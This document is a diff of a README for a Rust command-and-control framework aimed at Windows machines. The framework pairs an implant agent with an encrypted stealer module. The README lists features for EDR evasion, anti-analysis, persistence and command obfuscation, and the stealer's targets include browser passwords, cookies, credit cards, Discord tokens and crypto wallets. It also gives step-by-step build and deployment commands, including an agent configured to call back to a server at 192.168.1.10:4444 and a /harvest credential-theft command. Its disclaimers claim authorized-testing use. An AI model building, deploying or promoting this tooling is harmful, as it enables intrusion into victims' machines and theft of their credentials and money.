@@ -1,161 +1,277 @@
-# C2R2 v2.0 - Direct Connection
-Command & Control Framework written in Rust
+# C2R2-v2 - Command & Control Framework
 
-[![Rust](https://img.shields.io/badge/Rust-1.90.0-orange.svg)](https://www.rust-lang.org/)
-[![License](https://img.shields.io/badge/License-Educational-red.svg)](LICENSE)
+[![Rust](https://img.shields.io/badge/Rust-1.70+-orange.svg)](https://www.rust-lang.org/)
+[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 [![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)](https://www.microsoft.com/windows)
+[![Documentation](https://img.shields.io/badge/docs-latest-brightgreen.svg)](docs/)
 
-## ⚠️ Educational Purpose Only
-**Do not use this tool for illegal activities. This project is for educational and authorized security testing purposes only.**
+A modular offensive security framework written in Rust, designed for authorized penetration testing and red team operations.
+
+## ⚠️ LEGAL DISCLAIMER
+
+**FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY**
+
+This tool is provided for security researchers, penetration testers, and educational purposes. Any unauthorized use of this software to compromise systems you do not own or have explicit written permission to test is **illegal** and **unethical**.
+
+**The authors and contributors assume NO LIABILITY for misuse or damages caused by this software.**
+
+By using C2R2-v2, you agree to:
+- ✅ Use it only on systems you own or have written authorization to test
+- ✅ Comply with all applicable laws and regulations  
+- ✅ Take full responsibility for your actions
+- ❌ NEVER use it for illegal or malicious purposes
+
+**Unauthorized access to computer systems is a crime. You have been warned.**
+
+---z
+
+## 📖 Documentation
+
+**Complete documentation is available in the [`/docs`](docs/) directory:**
+
+- **[Getting Started](docs/README.md)** - Overview and introduction
+- **[Installation Guide](docs/INSTALLATION.md)** - Build and setup instructions
+- **[Usage Guide](docs/USAGE.md)** - Command reference and examples
+- **[Architecture](docs/ARCHITECTURE.md)** - System design and components
+- **[Modules](docs/MODULES.md)** - Module documentation and development
+- **[API Reference](docs/API.md)** - Developer API documentation
+- **[Security](docs/SECURITY.md)** - Security considerations and OPSEC
+- **[Contributing](docs/CONTRIBUTING.md)** - How to contribute
+- **[Development](docs/DEVELOPMENT.md)** - Development guide
+
+---
+
+## 🎯 What is C2R2-v2?
+
+C2R2-v2 (Command & Control Rust Reloaded) is a modular offensive security suite inspired by professional frameworks like Havoc C2 and Cobalt Strike. Built entirely in Rust, it combines memory safety with powerful capabilities for authorized security testing.
 
 ---
 
 ## 🚀 Features
 
-### v2.0 - Direct Connection (Current)
-- ✅ **Direct TCP Connection** - No shellcode, no encryption overhead
+### Core Capabilities
+
+- ✅ **Lightweight Agent** - ~60KB binary with minimal dependencies
 - ✅ **Multi-Client Support** - Handle multiple agents simultaneously
-- ✅ **System Information** - Auto-collect hostname, username, OS, privileges
-- ✅ **Remote Command Execution** - Execute arbitrary commands via cmd
-- ✅ **Command Obfuscation** - Automatic ArgFuscator-style obfuscation for all commands
-- ✅ **File Transfer** - Download/Upload files with Base64 encoding
-- ✅ **Beacon Communication** - Configurable intervals with jitter to evade detection
-- ✅ **Persistence Mechanisms** - Registry, Scheduled Tasks, WMI Events (APT-like)
-- ✅ **Colored CLI** - Beautiful terminal interface with tables
-- ✅ **Cross-Compilation** - Build Windows agents from Linux (Kali)
-- ✅ **Lightweight Agent** - ~60KB binary, zero dependencies
+- ✅ **Beacon Communication** - Configurable intervals with jitter for stealth
+- ✅ **Command Execution** - Remote shell with automatic obfuscation
+- ✅ **File Operations** - Bidirectional file transfer (upload/download)
+- ✅ **Persistence** - Multiple mechanisms (Registry, Tasks, WMI, Startup)
+- ✅ **Credential Harvesting** - Multi-browser and application credential stealing
+- ✅ **Cross-Compilation** - Build Windows agents from Linux/WSL
+- ✅ **Modular Architecture** - Load capabilities on-demand via encrypted modules
+
+### Advanced Features
+
+- 🔒 **Direct Syscalls** - Bypass userland hooks (EDR evasion)
+- 🎭 **Command Obfuscation** - ArgFuscator-style obfuscation for all commands
+- 🔐 **Module Encryption** - AES-256-GCM encrypted capability modules
+- 🎯 **Anti-Analysis** - Debugger, VM, and sandbox detection
+- 📊 **Structured Logging** - Comprehensive activity logging
+- 🎨 **Colored CLI** - Beautiful terminal interface with tables
 
 ### Available Commands
+
 ```
-📋 /list                      - List all connected clients
-🎯 /select <id>               - Select a client by ID
-📤 /cmd <command>             - Send command to selected client
-📡 /cmd_all <command>         - Send command to ALL clients
-📥 /download <remote_path>    - Download file from agent
-📤 /upload <local> <remote>   - Upload file to agent
-🔑 /harvest                   - Steal credentials from browsers
-📌 /persist <method>          - Establish persistence (registry|task|wmi|startup)
-🧹 /persist_remove            - Remove persistence from agent
-📡 /beacon <int:jit>          - Configure beacon interval (e.g., 60:30 = 60s ±30%)
-ℹ️  /info <id>                - Show detailed client information
-🔄 /deselect                  - Deselect current client
-❓ /help                      - Show help menu
-👋 /exit, /quit               - Close server
+📋 Client Management:
+   /list                      - List all connected clients
+   /select <id>               - Select a client by ID
+   /deselect                  - Deselect current client
+   /info <id>                 - Show detailed client information
+
+💻 Command Execution:
+   /cmd <command>             - Execute command on selected client
+   /cmd_all <command>         - Execute command on ALL clients
+
+📁 File Operations:
+   /download <remote_path>    - Download file from agent
+   /upload <local> <remote>   - Upload file to agent
+
+🔧 Advanced Operations:
+   /harvest                   - Harvest credentials from browsers/apps
+   /persist <method>          - Establish persistence (registry|task|wmi|startup)
+   /persist_remove            - Remove all persistence mechanisms
+   /beacon <int:jit>          - Configure beacon timing (e.g., 60:30)
+
+ℹ️  Server:
+   /help                      - Show command help
+   /exit, /quit               - Shutdown server
 ```
+
+For detailed command usage and examples, see the [Usage Guide](docs/USAGE.md).
 
 ---
 
-## 🔧 Installation & Usage
+## 🏗️ Architecture
+
+C2R2-v2 follows a modular client-server architecture:
+
+```
+┌─────────────────┐
+│   C2 Server     │  ◄─── Operator (Terminal/CLI)
+│  (c2r2-server)  │
+└────────┬────────┘
+         │
+         │ TCP Beacon (with jitter)
+         ▼
+┌─────────────────┐
+│     Agent       │  ◄─── Target System (Windows)
+│   (agent.exe)   │
+└────────┬────────┘
+         │
+         │ Dynamic Loading
+         ▼
+┌─────────────────┐
+│ Stealer Module  │  ◄─── Encrypted DLL Module
+│ (stealer.dll)   │
+└─────────────────┘
+```
+
+**Components:**
+- **Agent** - Lightweight implant (60KB) with beacon communication
+- **C2 Server** - Async multi-client server with interactive CLI
+- **Builder** - Tool for agent generation and module encryption
+- **Stealer** - Modular credential harvesting capability
+
+For detailed architecture documentation, see [Architecture Guide](docs/ARCHITECTURE.md).
+
+---
+
+## 🔧 Quick Start
 
 ### Prerequisites
 
-#### En Linux/WSL/Kali
-```bash
-# Rust toolchain
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+- Rust 1.70+ (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)
+- MinGW-w64 (`sudo apt install mingw-w64`)
+- Windows target (`rustup target add x86_64-pc-windows-gnu`)
 
-# MinGW-w64 para cross-compilation a Windows
-sudo apt install mingw-w64
+**Full installation instructions:** [Installation Guide](docs/INSTALLATION.md)
 
-# Target de Windows para Rust
-rustup target add x86_64-pc-windows-gnu
-```
-
-### Building the Project
-
-#### 1. Compilar el módulo Stealer (Windows DLL desde Linux)
+### Building
 
 ```bash
-# Opción A: Script automatizado
+# 1. Build stealer module
 ./build-stealer.sh
 
-# Opción B: Manual
-cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll
-# Genera: target/x86_64-pc-windows-gnu/release/stealer.dll
-```
-
-#### 2. Encriptar el módulo Stealer
-
-```bash
+# 2. Encrypt module
 cd builder
 cargo run --release -- encrypt-module
-# Genera: c2r2-server/modules/stealer.enc y stealer.key
-```
 
-#### 3. Compilar el servidor C2
-
-```bash
-cd c2r2-server
-cargo -p c2r2-server build --release
-# Genera: target/release/c2r2-server (Linux/WSL)
-```
-
-#### 4. Generar el agente (lightweight)
-
-```bash
-cd builder
+# 3. Build agent
 cargo run --release -- build-agent --name agent1 --server 192.168.1.10:4444
-# Genera: output/agent1.exe (~500 KB)
+
+# 4. Build server
+cd ../c2r2-server
+cargo build --release
 ```
 
-**Ver más detalles en [builder/README.md](builder/README.md)**
-
-### Running the C2 Server
+### Running
 
 ```bash
+# Start C2 server
 cd c2r2-server
 ./target/release/c2r2-server
 
-# El servidor escucha en 0.0.0.0:4444 por defecto
+# Deploy agent to target (Windows)
+# Then interact from server:
+C2R2> /list
+C2R2> /select 1
+C2R2 [1]> /cmd whoami
+C2R2 [1]> /harvest
 ```
 
-### Deploying the Agent
+**Complete usage guide:** [Usage Documentation](docs/USAGE.md)
 
-```bash
-# Transferir el agente a la máquina objetivo (Windows)
-# El agente se conecta automáticamente al servidor configurado
+---
 
-# Desde el servidor C2, usar comandos:
-/clients              # Ver agentes conectados
-/select <id>          # Seleccionar un agente
-/upload <file>        # Subir archivo al agente
-/harvest              # Ejecutar stealer (requiere módulo encriptado)
-```
+## 🛡️ Security Features
 
-https://github.com/1N73LL1G3NC3x/Nightmangle/tree/master?tab=readme-ov-file
+### Evasion Techniques
 
-## ToDo
+- **Direct Syscalls**: Bypass userland API hooks (EDR/AV evasion)
+- **String Obfuscation**: Compile-time encryption of sensitive strings
+- **Command Obfuscation**: ArgFuscator techniques for command-line evasion
+- **Module Encryption**: AES-256-GCM encrypted capability modules
+- **Memory-Only Loading**: Modules loaded directly into memory
+- **Beacon Jitter**: Randomized check-in timing to avoid patterns
+- **Anti-Analysis**: Debugger, VM, and sandbox detection
 
+### Operational Security
 
-- [x] Que no aparezca la consola del agente
-- [x] Crear un listener para tener multiples conexiones simultaneas con diferentes agentes
-- [x] Implementar comunicación tipo beacon con jitter para evasión
-- [x] Crear persistencia en Windows (Registry, Scheduled Tasks, WMI Events)
-- [x] Implementar ofuscación de comandos con ArgFuscator
-- [ ] Mejorar la ofuscación del agente
+See [Security Guide](docs/SECURITY.md) for:
+- OPSEC best practices
+- Detection evasion strategies
+- Incident response procedures
+- Threat model and adversaries
 
-### Command Obfuscation (ArgFuscator)
-- [x] Implementar ofuscación automática de comandos
-- [x] Random case changes (wHoAmI)
-- [x] Character insertion with carets (who^ami)
-- [x] Quote insertion around arguments
-- [x] Environment variable substitution (%windir%)
-- [x] Aplicar ofuscación a todos los comandos (/cmd, /cmd_all)
-- [x] Aplicar ofuscación a comandos de persistencia (registry, task, wmi)
+---
 
-Ver [ARGFUSCATOR_IMPLEMENTATION.md](ARGFUSCATOR_IMPLEMENTATION.md) para más detalles y ejemplos.
+## 📦 Modules
 
-### Crear persistencia
-- [x] Cuando se ejecute el agente, que se copie a %APPDATA% y se añada al registro para que se ejecute al iniciar sesión o al iniciar el sistema.
-- [ ] Que se pueda inyectar en un proceso legítimo (explorer.exe, svchost.exe, etc)
+### Stealer Module
 
+Harvests credentials and sensitive data from:
 
-### Listener
-- [x] Crear un listener con sockets para tener multiples conexiones simultaneas con diferentes agentes
-- [x] Implementar comunicación asíncrona con beacon/jitter para evasión
-- [x] Sleep con jitter y exponential backoff para evitar detección heurística
-- [ ] Crear un servidor que se encargue de recibir las conexiones de los agentes y enviarles comandos y que este servidor se comunique con la interfaz C2 (Telegram bot, web, etc)
+- **Browsers**: Chrome, Firefox, Edge, Brave, Opera, Vivaldi
+- **Communication**: Discord tokens, Telegram sessions
+- **Wallets**: Exodus, Atomic, Electrum, Metamask
+- **Gaming**: Steam, Epic Games
+- **Data Types**: Passwords, cookies, autofill, credit cards
 
-### Interfaz C2
-- [ ] Crear una interfaz mediante Telegram bot que permita enviar comandos y recibir respuestas de los agentes
+For module development and API reference, see [Modules Documentation](docs/MODULES.md).
+
+---
+
+## 🤝 Contributing
+
+Contributions are welcome! Please read our [Contributing Guidelines](docs/CONTRIBUTING.md) before submitting pull requests.
+
+### Development
+
+See the [Development Guide](docs/DEVELOPMENT.md) for:
+- Project structure
+- Development setup
+- Coding standards
+- Testing procedures
+- API documentation
+
+---
+
+## 📝 License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+**IMPORTANT**: This software is provided for educational and authorized testing purposes only. See the license file for the full disclaimer.
+
+---
+
+## 🙏 Acknowledgments
+
+C2R2-v2 is inspired by:
+- [Havoc C2](https://github.com/HavocFramework/Havoc) - Modern C2 framework
+- [Cobalt Strike](https://www.cobaltstrike.com/) - Industry-standard red team tool
+- [Metasploit](https://www.metasploit.com/) - Modular penetration testing framework
+- [Covenant](https://github.com/cobbr/Covenant) - .NET C2 framework
+
+Special thanks to the Rust community and security research community for their tools and techniques.
+
+---
+
+## 📧 Contact & Support
+
+- **Issues**: [GitHub Issues](https://github.com/G4sp4rCS/C2R2-v2/issues)
+- **Discussions**: [GitHub Discussions](https://github.com/G4sp4rCS/C2R2-v2/discussions)
+- **Security**: Report vulnerabilities via [GitHub Security Advisories](https://github.com/G4sp4rCS/C2R2-v2/security/advisories)
+
+---
+
+## 📚 Version History
+
+See [CHANGELOG.md](CHANGELOG.md) for version history and release notes.
+
+**Current Version**: 2.0.0
+
+---
+
+**⚠️ Remember: With great power comes great responsibility. Use this tool ethically and legally. Always obtain proper authorization before testing any systems.**
 
